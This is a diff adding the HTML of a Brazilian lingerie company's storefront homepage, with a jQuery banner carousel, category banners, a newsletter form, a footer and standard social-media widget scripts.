+        bannerSlider.on('jcarousel:create jcarousel:reload', function() {
+            var element = $(this),
+                width = element.innerWidth();
+            element.jcarousel('items').css('width', width + 'px');
+            var height = (element.innerHeight()/2) - 45;
+            if (height <= 0) {
+                height = (Math.round(width/2.479)/2) - 45;
+            }
+            if (height > 0) {
+                $('#banner-slider-outer-wrapper .jcarousel-control-prev').css('top', height + 'px');
+                $('#banner-slider-outer-wrapper .jcarousel-control-next').css('top', height + 'px');
+            }
+        }).jcarousel({
+            wrap: 'circular'        })        .jcarouselAutoscroll({
+            interval: 5000,
+            target: '+=1',
+            autostart: true
+        })
+        ;
+
+        $('#banner-slider-outer-wrapper .jcarousel-control-prev')
+            .on('jcarouselcontrol:active', function() {
+                $(this).removeClass('inactive');
+            })
+            .on('jcarouselcontrol:inactive', function() {
+                $(this).addClass('inactive');
+            })
+            .jcarouselControl({
+                target: '-=1'
+            });
+
+        $('#banner-slider-outer-wrapper .jcarousel-control-next')
+            .on('jcarouselcontrol:active', function() {
+                $(this).removeClass('inactive');
+            })
+            .on('jcarouselcontrol:inactive', function() {
+                $(this).addClass('inactive');
+            })
+            .jcarouselControl({
+                target: '+=1'
+            });
+
+        $('#banner-slider-outer-wrapper .jcarousel-pagination')
+            .on('jcarouselpagination:active', 'a', function() {
+                $(this).addClass('active');
+            })
+            .on('jcarouselpagination:inactive', 'a', function() {
+                $(this).removeClass('active');
+            })
+            .jcarouselPagination();
+    });
+})(jQuery);
+//]]>
+</script>
+</p>
+<div class="long-banner"><a title="Tangas" href="http://sensualle.com.br/tangas.html"><img class="img-responsive" src="http://sensualle.com.br/media/wysiwyg/Banner-2.jpg" alt="" /></a></div>
+<div class="triple-banner row">
+<div class="col-xs-4"><a title="&Eacute; DANDO QUE SE RECEBE" href="http://sensualle.com.br/colecoes/e-dando-que-se-recebe.html"><img class="img-responsive" src="http://sensualle.com.br/media/wysiwyg/Banner-3.1.jpg" alt="" /></a></div>
+<div class="col-xs-4"><a title="PAPAI, CORA&Ccedil;&Atilde;O TEM PERNAS?" href="http://sensualle.com.br/colecoes/papai-coracao-tem-pernas.html"><img class="img-responsive" src="http://sensualle.com.br/media/wysiwyg/Banner-4.1.jpg" alt="" /></a></div>
+<div class="col-xs-4"><a title="BEST SELLERS" href="http://sensualle.com.br/colecoes/best-sellers.html"><img class="img-responsive" src="http://sensualle.com.br/media/wysiwyg/Banner-5.2.jpg" alt="" /></a></div>
+</div>
+<div class="double-banner row">
+<div class="col-xs-6"><a title="Suti&atilde;s" href="http://sensualle.com.br/sutias.html"><img class="img-responsive" src="http://sensualle.com.br/media/wysiwyg/Banner-6.1.jpg" alt="" /></a></div>
+<div class="col-xs-6"><a title="Espartilhos" href="http://sensualle.com.br/nightwear/espartilhos.html"><img class="img-responsive" src="http://sensualle.com.br/media/wysiwyg/Banner-7.1.jpg" alt="" /></a></div>
+</div>
+<div class="page-title">
+<h1>OS GRANDES LAN&Ccedil;AMENTOS</h1>
+</div>
+<div>
+<p class="note-msg">Não há produtos com esta seleção.</p>
+</div>
+<div class="large-banner"><a title="Nightwear" href="http://sensualle.com.br/nightwear.html"><img class="img-responsive" src="http://sensualle.com.br/media/wysiwyg/Banner-8.1.jpg" alt="" /></a></div>
+<div class="double-banner row">
+<div class="col-xs-6"><a title="Mata-Homem" href="http://sensualle.com.br/mata-homem.html"><img class="img-responsive" src="http://sensualle.com.br/media/wysiwyg/Banner-9.1.jpg" alt="" /></a></div>
+<div class="col-xs-6"><a title="Para Eles" href="http://sensualle.com.br/cuecas.html"><img class="img-responsive" src="http://sensualle.com.br/media/wysiwyg/Banner-10.1.jpg" alt="" /></a></div>
+</div></div>                </div>
+            </div>
+        </div>
+        
+<div class="bgNews">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-8"><div class="block block-subscribe">
+    <div class="block-title">
+        <strong><span></span>receba nossas ofertas</strong>
+        <p>Fique por dentro. receba nossas novidades direto no seu e-mail</p>
+    </div>
+    <form action="http://sensualle.com.br/newsletter/subscriber/new/" method="post" id="newsletter-validate-detail">
+        <div class="block-content">
+            <div class="input-box">
+               <input type="text" name="email" id="newsletter" title="Assine nosso boletim informativo" placeholder="Cadastre o seu e-mail" class="input-text required-entry validate-email" />
+            </div>
+            <div class="actions">
+                <button type="submit" title="Assinar" class="button"><span><span>Enviar</span></span></button>
+            </div>
+        </div>
+    </form>
+    <script type="text/javascript">
+    //<![CDATA[
+        var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
+    //]]>
+    </script>
+</div>
+</div>
+            <div class="col-xs-12 col-sm-12 col-md-4">
+                <div class="caixa-redes-sociais">
+                    <span class="ico-coracao"></span>
+                    <strong>junte-se a nós</strong>
+                    <a href="" target="_blank" class="link-facebook">facebook</a>
+                    <a href="" target="_blank" class="link-twitter">twitter</a>
+                    <a href="" target="_blank" class="link-instagram">instagram</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<footer class="footer-container">
+    <div class="container footer">                   
+        <div class="row">
+            <div class="col-xs-12 col-sm-5 footer-store-description">
+                <p><img src="http://sensualle.com.br/media/wysiwyg/Banners/logo.jpg" alt="" />&nbsp; &nbsp; &nbsp; &nbsp;<strong style="color: #ff3399; font-size: small;">&nbsp;Voc&ecirc; nunca viu&nbsp;</strong><strong style="color: #ff3399; font-size: small;">Lingerie Igual</strong></p>
+<p>&nbsp;</p>
+<p style="text-align: justify;">&nbsp; Localizada em Nova Friburgo - RJ, o principal polo de moda &iacute;ntima do Brasil, a Sensualle come&ccedil;ou a produzir nos anos 90 criando produtos inspirados na sensualidade da mulher brasileira.</p>
+<p style="text-align: justify;">&nbsp; Com o grande sucesso dos seus produtos exclusivos, originais e com mat&eacute;rias-primas de alta qualidade, a f&aacute;brica cresce, a cada ano, mais e mais!</p>
+<p style="text-align: justify;">&nbsp; Nossos produtos podem ser achados em mais de 1.200 pontos de venda nos 26 estados do Brasil e em mais de 30 pa&iacute;ses, cobrindo os cinco continentes.&nbsp;&nbsp;Ent&atilde;o, venha conferir nossos modelos &uacute;nicos, super criativos e que est&atilde;o sempre na moda. Desenvolvemos cada produto com muito carinho e sempre pensando em surpreender homens e mulheres em todas as partes do mundo.&nbsp;</p>
+<p>&nbsp;</p>
+<p><strong><span>Lingerie &hearts; Sexy -</span>&nbsp;<a href="http://www.sensualle.com.br/" rel="nofollow nofollow" target="_blank">www.sensualle.com.br</a></strong><br />#Sensualle &nbsp;#LingerieSexy</p>
+<p><strong style="color: #ff3399; font-size: small;"><br /></strong></p>
+<p>&nbsp;</p>            </div>
+            <div class="links-rodape col-xs-12 col-sm-7">
+                <div class="col-sm-12 col-md-3">
+                    <ul>
+<li class="title">
+<h1>Institucional</h1>
+</li>
+<li><a href="http://sensualle.com.br/quem-somos">Quem Somos?</a></li>
+<li><a title="Tabela de Medidas" href="http://sensualle.com.br/tabela-de-medidas">Tabela de Medidas</a></li>
+<li><a title="Cat&aacute;logos Virtuais" href="http://sensualle.com.br/catalogos-virtuais">Cat&aacute;logos Virtuais</a></li>
+<li><a title="Loja Virtual" href="http://lojasensualle.com.br/">Loja Virtual</a></li>
+</ul>                </div>
+                <div class="col-sm-12 col-md-4">
+                    <ul>
+<li class="title">
+<h1>Ajuda e Suporte</h1>
+</li>
+<li><a href="http://sensualle.com.br/central-de-atendimento">Central de Atendimento</a></li>
+<li>Telefone: + 55 (22) 2533.5719</li>
+<li>E-mail: contato@sensualle.com.br</li>
+</ul>                </div>
+                <div class="col-sm-12 col-md-5">
+                    <ul>
+<li class="title"><h1>Segurança</h1></li>
+<li><a href="http://www.google.com.br/safebrowsing/diagnostic?site=icoz.com.br/"><img width="150" height="70" src="http://sensualle.com.br/skin/frontend/default/icoz/images/google_safe_browsing.png" alt="Navegação Segura Google" /></a></li>
+</ul>                </div>
+                <div class="lista-pagamento">
+                                    </div>
+                <div class="lista-selos">
+                    <ul>
+<li><div class="fb-like-box" data-href="https://www.facebook.com/pages/Sensualle-Lingerie/172948012769023?ref=hl" data-width="300" data-height="258" data-colorscheme="light" data-show-faces="false" data-header="true" data-stream="true" data-show-border="true"></div></li>
+</ul>                </div>
+            </div>
+        </div>
+        <div class="row copyright">
+            <ul class="col-xs-12 col-sm-10">
+                <li class="first"><address>Sua Loja | CNPJ: 00.000.000/0000-00 | Rua da Sua Loja, 123 – Bairro – Cidade – 00-000-000<br />Copyright &copy; 2014 Sua Loja. Todos os direitos reservados.</address></li>
+            </ul>
+            <ul class="col-xs-12 last col-sm-2">
+                <li style="float:right;"><a href="http://icoz.com.br" target="_blank"><img width="108" height="21" class="img-responsive" src="http://sensualle.com.br/skin/frontend/default/icoz/images/icoz.png" title="Icoz Web" alt="Icoz Web" /></a></li>
+            </ul>
+        </div>
+    </div>
+</footer>        <script type="text/javascript">
+  window.___gcfg = {
+    lang: 'pt_BR'
+  };
+</script>
+<script type="text/javascript" src="https://apis.google.com/js/platform.js" async defer></script>
+<script type="text/javascript">!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+<script type="text/javascript" async defer src="//assets.pinterest.com/js/pinit.js"></script>
+    </div>
+</div>
+</body>
+</html>
